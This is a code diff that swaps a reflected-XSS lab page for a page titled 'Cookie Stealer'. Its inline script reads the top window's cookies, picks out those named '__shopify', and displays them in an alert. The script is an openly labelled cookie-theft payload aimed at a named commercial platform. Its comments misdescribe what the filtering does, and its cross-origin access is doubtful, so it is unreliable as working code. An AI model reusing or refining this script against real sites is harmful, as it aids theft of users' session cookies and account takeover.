@@ -3,18 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reflected XSS Lab</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Cookie Stealer</title>
 </head>
 <body>
-    <div class="container">
-        <h1>Reflected XSS Lab</h1>
-        <form id="searchForm">
-            <input type="text" id="searchInput" placeholder="Search..." required>
-            <button type="submit">Search</button>
-        </form>
-        <div id="result"></div>
-    </div>
-    <script src="script.js"></script>
+    <script>
+        // Function to retrieve and display cookies from cdn.shopify.com
+        function displayShopifyCookies() {
+            // Access the top window's document to get cookies
+            const topWindow = window.top;
+            const shopifyCookies = topWindow.document.cookie;
+
+            // Filter cookies to only include those from cdn.shopify.com
+            const shopifyCookieArray = shopifyCookies.split(';').filter(cookie => cookie.trim().startsWith('__shopify'));
+            const shopifyCookiesString = shopifyCookieArray.join('; ');
+
+            alert('Shopify Cookies: ' + shopifyCookiesString);
+        }
+
+        // Call the function to display Shopify cookies
+        displayShopifyCookies();
+    </script>
 </body>
 </html>
+```__
